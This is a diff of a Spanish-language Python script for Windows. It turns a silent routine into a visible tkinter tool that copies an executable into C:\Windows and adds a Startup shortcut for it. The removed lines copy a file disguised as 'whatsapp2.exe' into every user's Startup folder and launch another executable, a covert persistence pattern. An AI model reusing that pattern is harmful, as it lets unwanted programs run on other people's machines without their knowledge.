@@ -1,99 +1,137 @@
 import os
 import shutil
+import tkinter as tk
+from tkinter import ttk, filedialog, messagebox
 import win32com.client
-import subprocess
 import sys
 
-def verificar_sistema_operativo():
-    if os.name == "nt":
-        print("El sistema operativo es Windows.")
-        listar_startup_usuarios_windows()
-    else:
-        print("El sistema operativo no es Windows.")
+class StartupApp:
+    def __init__(self, master):
+        self.master = master
+        master.title("Configurador de Startup")
+        master.geometry("500x300")
 
-def listar_startup_usuarios_windows():
-    ruta_usuarios = "C:\\Users"
-    usuarios_a_ignorar = {
-        "All Users",
-        "Default",
-        "Default User",
-        "defaultuser1",
-        "Public"
-    }
+        # Variables
+        self.all_users = tk.BooleanVar()
+        self.file_path = tk.StringVar()
+        self.dest_path = tk.StringVar(value=os.environ['SystemRoot'])  # C:\Windows por defecto
 
-    try:
-        nombres_usuarios = [nombre for nombre in os.listdir(ruta_usuarios)
-                            if os.path.isdir(os.path.join(ruta_usuarios, nombre)) and nombre not in usuarios_a_ignorar]
+        # Widgets
+        self.create_widgets()
+        self.all_users.trace_add('write', self.toggle_destination)
 
-        for usuario in nombres_usuarios:
-            ruta_startup = os.path.join(ruta_usuarios, usuario, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-            
-            if os.path.exists(ruta_startup):
-                print(f"Contenido de {ruta_startup}:")
-                contenido_startup = os.listdir(ruta_startup)
-                
-                ruta = r"C:\Windows"
-                archivo = "whatsapp2.exe"
-                
-                copiar_archivo_a_ruta(ruta, archivo, ruta_startup)
-                
-                if contenido_startup:
-                    for elemento in contenido_startup:
-                        print(f"  {elemento}")
-                else:
-                    print("  La carpeta está vacía.")
-            else:
-                print(f"La carpeta {ruta_startup} no existe.")
-    except Exception as e:
-        print(f"Ocurrió un error al listar los usuarios: {e}")
+    def create_widgets(self):
+        # Marco principal
+        main_frame = ttk.Frame(self.master, padding=10)
+        main_frame.pack(fill=tk.BOTH, expand=True)
 
-def copiar_archivo_a_ruta(destino, nombre_archivo, ruta_acceso_directo):
-    ruta_origen = os.path.join(os.path.dirname(sys.executable), nombre_archivo)
-    
-    if not os.path.exists(ruta_origen):
-        print(f"El archivo {nombre_archivo} no existe en la carpeta del script.")
-        return
+        # Selección de archivo
+        ttk.Label(main_frame, text="Archivo a copiar:").grid(row=0, column=0, sticky=tk.W)
+        file_entry = ttk.Entry(main_frame, textvariable=self.file_path, width=40)
+        file_entry.grid(row=0, column=1, padx=5)
+        ttk.Button(main_frame, text="Examinar", command=self.browse_file).grid(row=0, column=2)
 
-    ruta_destino = os.path.join(destino, nombre_archivo)
-    
-    try:
-        shutil.copy(ruta_origen, ruta_destino)
-        print(f"Archivo {nombre_archivo} copiado a {destino} exitosamente.")
-        
-        crear_acceso_directo(ruta_destino, ruta_acceso_directo, nombre_archivo)
-        print(f"Acceso directo de {nombre_archivo} creado en {ruta_acceso_directo} exitosamente.")
-    except Exception as e:
-        print(f"Ocurrió un error al copiar el archivo: {e}")
+        # Opción para todos los usuarios
+        ttk.Checkbutton(main_frame, 
+                       text="Agregar al startup de todos los usuarios",
+                       variable=self.all_users).grid(row=1, column=0, columnspan=3, pady=10, sticky=tk.W)
 
-def crear_acceso_directo(ruta_destino, ruta_acceso_directo, nombre_archivo):
-    if not os.path.exists(ruta_acceso_directo):
-        try:
-            os.makedirs(ruta_acceso_directo)
-            print(f"Carpeta {ruta_acceso_directo} creada exitosamente.")
-        except Exception as e:
-            print(f"Ocurrió un error al crear la carpeta {ruta_acceso_directo}: {e}")
+        # Ruta de destino
+        ttk.Label(main_frame, text="Ruta de destino:").grid(row=2, column=0, sticky=tk.W)
+        self.dest_entry = ttk.Entry(main_frame, textvariable=self.dest_path, width=40)
+        self.dest_entry.grid(row=2, column=1, padx=5)
+        ttk.Button(main_frame, 
+                  text="Ejecutar", 
+                  command=self.execute_operation).grid(row=3, column=0, columnspan=3, pady=20)
+
+        # Barra de progreso
+        self.progress = ttk.Progressbar(main_frame, orient=tk.HORIZONTAL, length=400, mode='determinate')
+        self.progress.grid(row=4, column=0, columnspan=3, pady=10)
+
+    def browse_file(self):
+        initial_dir = os.path.dirname(os.path.abspath(__file__))
+        file_path = filedialog.askopenfilename(
+            title="Seleccionar archivo",
+            initialdir=initial_dir,
+            filetypes=[("Ejecutables", "*.exe"), ("Todos los archivos", "*.*")]
+        )
+        if file_path:
+            self.file_path.set(file_path)
+
+    def toggle_destination(self, *args):
+        if self.all_users.get():
+            self.dest_entry.config(state=tk.DISABLED)
+            self.dest_path.set(os.environ['SystemRoot'])  # C:\Windows
+        else:
+            self.dest_entry.config(state=tk.NORMAL)
+
+    def execute_operation(self):
+        file_path = self.file_path.get()
+        dest_dir = self.dest_path.get()
+        all_users = self.all_users.get()
+
+        if not file_path:
+            messagebox.showerror("Error", "Selecciona un archivo primero")
             return
 
-    shell = win32com.client.Dispatch("WScript.Shell")
-    ruta_acceso_directo_completa = os.path.join(ruta_acceso_directo, f"{os.path.splitext(nombre_archivo)[0]}.lnk")
-    acceso_directo = shell.CreateShortCut(ruta_acceso_directo_completa)
-    acceso_directo.Targetpath = ruta_destino
-    acceso_directo.WorkingDirectory = os.path.dirname(ruta_destino)
-    acceso_directo.save()
+        try:
+            self.progress['value'] = 0
+            self.update_progress(25, "Copiando archivo...")
+            
+            # Copiar archivo
+            file_name = os.path.basename(file_path)
+            dest_path = os.path.join(dest_dir, file_name)
+            shutil.copy(file_path, dest_path)
+            
+            self.update_progress(50, "Creando acceso directo...")
+            
+            # Crear acceso directo
+            if all_users:
+                startup_folder = os.path.join(
+                    os.environ['ProgramData'],
+                    'Microsoft\Windows\Start Menu\Programs\Startup'
+                )
+            else:
+                startup_folder = os.path.join(
+                    os.environ['APPDATA'],
+                    'Microsoft\Windows\Start Menu\Programs\Startup'
+                )
+            
+            self.create_shortcut(dest_path, startup_folder, file_name)
+            
+            self.update_progress(100, "Operación completada!")
+            messagebox.showinfo("Éxito", "Archivo configurado correctamente en el startup")
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Ocurrió un error: {str(e)}")
+        finally:
+            self.progress['value'] = 0
 
-def ejecutar_exe(ruta_exe):
-    if not os.path.exists(ruta_exe):
-        print(f"El archivo {ruta_exe} no existe.")
-        return
+    def update_progress(self, value, message):
+        self.progress['value'] = value
+        self.master.title(message)
+        self.master.update_idletasks()
 
-    try:
-        subprocess.run([ruta_exe], check=True)
-        print(f"El archivo {ruta_exe} se ejecutó correctamente.")
-    except subprocess.CalledProcessError as e:
-        print(f"Ocurrió un error al ejecutar el archivo: {e}")
+    def create_shortcut(self, target_path, startup_folder, file_name):
+        if not os.path.exists(startup_folder):
+            os.makedirs(startup_folder)
+
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut_name = f"{os.path.splitext(file_name)[0]}.lnk"
+        shortcut_path = os.path.join(startup_folder, shortcut_name)
+        
+        shortcut = shell.CreateShortCut(shortcut_path)
+        shortcut.TargetPath = target_path
+        shortcut.WorkingDirectory = os.path.dirname(target_path)
+        shortcut.save()
 
 if __name__ == "__main__":
-    verificar_sistema_operativo()
-    ruta = r"C:\Windows\WinDPB.exe"
-    ejecutar_exe(ruta)
-    input("a")
+    root = tk.Tk()
+    app = StartupApp(root)
+    
+    # Verificar si es Windows
+    if os.name != "nt":
+        messagebox.showerror("Error", "Esta aplicación solo funciona en Windows")
+        sys.exit(1)
+    
+    root.mainloop()
